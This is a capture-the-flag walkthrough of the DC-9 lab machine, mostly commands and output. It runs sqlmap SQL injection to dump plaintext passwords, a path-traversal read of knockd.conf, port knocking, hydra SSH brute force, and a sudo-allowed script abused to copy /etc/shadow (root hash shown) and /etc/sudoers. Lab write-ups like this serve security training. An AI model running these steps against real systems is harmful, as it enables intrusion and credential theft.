# DC - 09 Walkthrough

## Enumeration

### Nmap

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ sudo nmap 192.168.182.134 -sSCV 

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:20 PST
Nmap scan report for 192.168.182.134
Host is up (0.0026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:C7:FE:46 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

## Exploitation

```sh
┌──(kali㉿kali)-[~/Desktop/dc09]
└─$ sqlmap -r search.txt --dbs

[...]

[23:05:50] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

Get all record from `users` database:

```sh
┌──(kali㉿kali)-[~/Desktop/dc09]
└─$ sqlmap -r search.txt -D users --dump-all    

[...]

Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[23:07:16] [INFO] table 'users.UserDetails' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.182.134/dump/users/UserDetails.csv'
```

Got the username and password. Now I extract them from CSV file, using Python script:

```
import csv

file_path = "/home/kali/.local/share/sqlmap/output/192.168.182.134/dump/users/UserDetails.csv"

f = open(file_path, 'r')
f_username = open('usernames.txt', 'w')
f_password = open('password.txt', 'w')

csv_reader = csv.DictReader(f)
row_number = 0

for row in csv_reader:
        if row_number == 0:
                row_number += 1
        else:
                row_number += 1
                username = row['username']
                password = row['password']
                f_username.write(username + "\n")
                f_password.write(password + "\n")
```

The target is block SSH port. So I find the way to cause it allows to connect to my exploit machine. I got this: 

- https://wiki.archlinux.org/title/Port_knocking
- https://www.unixmen.com/knockd-detailed-simpler/

Check the `knocd.conf` on URI `/manage.php?file=../../../../../etc/knockd.conf`:  

```
[options]
	UseSyslog

[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

Got the sequence number. Now run knock on Kali and re-scan port:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ knock 192.168.182.134 7469 8475 9842

┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ sudo nmap 192.168.182.134 -sSCV     
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:24 PST
Nmap scan report for 192.168.182.134
Host is up (0.000037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2b3387432740bc516dc13decb9b8ac3 (RSA)
|   256 065c93871554686b889155cff89ace40 (ECDSA)
|_  256 e42c88da8863268c93d5f7632ba3ebab (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:C7:FE:46 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Now SSH port is opened. Using `usernames.txt` and `password.txt` to try logging to target via ssh:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ hydra -L usernames.txt -P password.txt 192.168.182.134 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-07 23:26:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 256 login tries (l:16/p:16), ~16 tries per task
[DATA] attacking ssh://192.168.182.134:22/
[22][ssh] host: 192.168.182.134   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.182.134   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.182.134   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-07 23:27:16
```

Got the valid credentials. SSH to target:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ ssh janitor@192.168.182.134    
The authenticity of host '192.168.182.134 (192.168.182.134)' can't be established.
ED25519 key fingerprint is SHA256:QqKiAU3zrowiN9K1SVvmSWvLBZAqdSpT0aMLTwGlyvo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.134' (ED25519) to the list of known hosts.
janitor@192.168.182.134's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
janitor@dc-9:~$ 
```

## Privilege Escalation

List all file in user home directory:

```sh
janitor@dc-9:~$ ls -la
total 16
drwx------  4 janitor janitor 4096 Dec  8 17:27 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Dec  8 17:27 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
```

Got the secret folder named `secrets-for-putin`. Discover dis folder:

```sh
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls -la
total 12
drwx------ 2 janitor janitor 4096 Dec 29  2019 .
drwx------ 4 janitor janitor 4096 Dec  8 17:27 ..
-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt

janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

Found some password. Try bruteforcing ssh again:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ hydra -L usernames.txt -P password.txt 192.168.182.134 ssh -I     
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-08 00:33:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 352 login tries (l:16/p:22), ~22 tries per task
[DATA] attacking ssh://192.168.182.134:22/
[22][ssh] host: 192.168.182.134   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.182.134   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.182.134   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.182.134   login: janitor   password: Ilovepeepee
[STATUS] 341.00 tries/min, 341 tries in 00:01h, 13 to do in 00:01h, 14 active
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-08 00:34:17
```

Another valid credential is found. Login with this username and password.

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ ssh fredf@192.168.182.134  
fredf@192.168.182.134's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  8 18:17:06 2022 from 192.168.182.135
fredf@dc-9:~$ 
```

```sh
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
fredf@dc-9:~$ 
```

I found that I can run `/opt/devstuff/dist/test/test` with root privilege:

```sh
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test
Usage: python test.py read append
```

I don't know what `test` does, so I discover its sorce code:

```sh
fredf@dc-9:~$ cd /opt/devstuff/
fredf@dc-9:/opt/devstuff$ ls
build  dist  __pycache__  test.py  test.spec
fredf@dc-9:/opt/devstuff$ cat test.py 
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
fredf@dc-9:/opt/devstuff$ 
```

The `test` will read content of `read` file and append its content to `append` file. So I try getting `/etc/shadow` file content (which can be read only by root user) and append it to `/tmp/shadow` which can be read by anyone.

```sh
fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /etc/shadow /tmp/shadow
fredf@dc-9:/opt/devstuff$ cat /tmp/shadow 
root:$6$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:18259:0:99999:7:::
daemon:*:18259:0:99999:7:::
bin:*:18259:0:99999:7:::
sys:*:18259:0:99999:7:::
sync:*:18259:0:99999:7:::
games:*:18259:0:99999:7:::
man:*:18259:0:99999:7:::
lp:*:18259:0:99999:7:::
mail:*:18259:0:99999:7:::
news:*:18259:0:99999:7:::
uucp:*:18259:0:99999:7:::
proxy:*:18259:0:99999:7:::
www-data:*:18259:0:99999:7:::

[...]
```

The result is as expected. Now I read `/etc/sudoers` with above method:

```sh
fredf@dc-9:/opt/devstuff$ cat /tmp/sudoers

[...]

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

fredf   ALL=(root) NOPASSWD: /opt/devstuff/dist/test/test
```